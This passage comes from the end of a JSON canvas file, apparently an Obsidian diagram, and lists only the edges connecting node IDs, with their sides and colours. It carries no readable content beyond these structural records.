		{"id":"a727c83c4005ad27","fromNode":"a76559cfff78391f","fromSide":"left","toNode":"a53192eaeafaaa4c","toSide":"right","color":"5"},
		{"id":"574c086e6b2bcd53","fromNode":"f0ee24b1276def9e","fromSide":"bottom","toNode":"3ba9ae3e76777285","toSide":"left","color":"5"},
		{"id":"e7990e035b840fb9","fromNode":"3ba9ae3e76777285","fromSide":"right","toNode":"4bbf093ef181fa49","toSide":"left","color":"5"},
		{"id":"309800789b58e751","fromNode":"f54bfd7504bdda81","fromSide":"bottom","toNode":"c5feb11c6cdba705","toSide":"top","color":"#058ffc"},
		{"id":"212bf12b263941b2","fromNode":"f07066d567be9f7c","fromSide":"right","toNode":"f54bfd7504bdda81","toSide":"left","color":"#058ffc"},
		{"id":"c084beac1c28ce32","fromNode":"2e78f8741799e6c4","fromSide":"right","toNode":"0bf5a1b849ae43f4","toSide":"left","color":"#058ffd"},
		{"id":"87bb978e417316e4","fromNode":"040354d243694771","fromSide":"right","toNode":"ba5e554d0c838dcb","toSide":"left","color":"#058ffd"},
		{"id":"0c3554cdfb04ce0e","fromNode":"f0ee24b1276def9e","fromSide":"top","toNode":"8071303e71f3c9d6","toSide":"left","color":"#0599f5"},
		{"id":"05ec0ea9b74ee36b","fromNode":"8071303e71f3c9d6","fromSide":"right","toNode":"916af1f16a1123c0","toSide":"left","color":"#0599f5"},
		{"id":"fa93fefd15f90f5f","fromNode":"f0ee24b1276def9e","fromSide":"right","toNode":"f07066d567be9f7c","toSide":"left","color":"#058ffc"},
		{"id":"6416a84ce1452fe5","fromNode":"f0ee24b1276def9e","fromSide":"bottom","toNode":"040354d243694771","toSide":"left","color":"#058ffd"},
		{"id":"52e13530d44d6823","fromNode":"f0ee24b1276def9e","fromSide":"bottom","toNode":"2e78f8741799e6c4","toSide":"left","color":"#058ffd"},
		{"id":"af6db36a92fe6789","fromNode":"090194c0627c8cb0","fromSide":"right","toNode":"d8533c9cf8c921a6","toSide":"left","color":"#058ffd"},
		{"id":"8d01ffa27adeb7b6","fromNode":"f0ee24b1276def9e","fromSide":"top","toNode":"090194c0627c8cb0","toSide":"left","color":"#058ffd"},
		{"id":"22fa3e96548216a4","fromNode":"fe4ea51386701d2d","fromSide":"right","toNode":"e160eb1029a9134f","toSide":"top","color":"#0400ff"},
		{"id":"916dd1f2846ce339","fromNode":"a4fb9ae693757365","fromSide":"left","toNode":"724e56c410ad7ba7","toSide":"right","color":"5"},
		{"id":"b54479c243e155d0","fromNode":"176c9b654332b164","fromSide":"right","toNode":"1bcad6de7b2808ec","toSide":"left","color":"5"},
		{"id":"a853e5a1a6233fc9","fromNode":"1bcad6de7b2808ec","fromSide":"top","toNode":"07118be53d806c00","toSide":"left","color":"5"},
		{"id":"841cff4cd5a24afa","fromNode":"4665eb8b32ad4ede","fromSide":"right","toNode":"71521985f7f09781","toSide":"left"},
		{"id":"7ab1a52f2c250a37","fromNode":"c5163b6b6363c2cc","fromSide":"right","toNode":"2bef54ee213a771b","toSide":"left","color":"2"},
		{"id":"5bdbd27baf38bf5a","fromNode":"2bef54ee213a771b","fromSide":"right","toNode":"f9004794f97d0244","toSide":"bottom","color":"2"},
		{"id":"405ad0cad9ef83be","fromNode":"f9004794f97d0244","fromSide":"right","toNode":"28513652a61ed161","toSide":"left","color":"2"},
		{"id":"c1c4ec3ef0999d66","fromNode":"0293d6c1b4598b68","fromSide":"right","toNode":"76d5010c1f050777","toSide":"left"},
		{"id":"308ca127ebacea4c","fromNode":"76d5010c1f050777","fromSide":"right","toNode":"720845d99c221856","toSide":"left"},
		{"id":"a2c4589943d31787","fromNode":"720845d99c221856","fromSide":"right","toNode":"a3af13c29c7c986e","toSide":"left"},
		{"id":"c1dee9fbe4e23118","fromNode":"76d5010c1f050777","fromSide":"right","toNode":"88d8fd350f60d743","toSide":"left"},
		{"id":"077a8bbe3d010716","fromNode":"88d8fd350f60d743","fromSide":"right","toNode":"784329b04ea79f41","toSide":"left"},
		{"id":"ae17feeec197c870","fromNode":"76d5010c1f050777","fromSide":"right","toNode":"cc7ad6932ca73d55","toSide":"left"},
		{"id":"dd91212ca2ad925d","fromNode":"cc7ad6932ca73d55","fromSide":"right","toNode":"ea91928f7ddfc9f0","toSide":"left"},
		{"id":"eaa90976a4821a59","fromNode":"13f32d1f193f5038","fromSide":"right","toNode":"30b436478509e521","toSide":"left"},
		{"id":"7bba7269638a78ea","fromNode":"6b35698f8767bcd0","fromSide":"right","toNode":"e7db0e78be1cb482","toSide":"left"},
		{"id":"d26faafcb54b86b3","fromNode":"fd20440e9c030e43","fromSide":"right","toNode":"6b35698f8767bcd0","toSide":"left"},
		{"id":"e2e7d305617a261e","fromNode":"fd20440e9c030e43","fromSide":"right","toNode":"13f32d1f193f5038","toSide":"left"},
		{"id":"a53caac0ce9098e3","fromNode":"fd20440e9c030e43","fromSide":"right","toNode":"a0476fae22727811","toSide":"left"},
		{"id":"a238f12883355280","fromNode":"fd20440e9c030e43","fromSide":"right","toNode":"9bd198a34318a26e","toSide":"left"},
		{"id":"3cf84d5530c009ff","fromNode":"d8533c9cf8c921a6","fromSide":"left","toNode":"1119dcefec71ec4a","toSide":"left","color":"#0400ff"},
		{"id":"7910c33595ae5658","fromNode":"1119dcefec71ec4a","fromSide":"right","toNode":"fe4ea51386701d2d","toSide":"left","color":"#0400ff"}
	]
}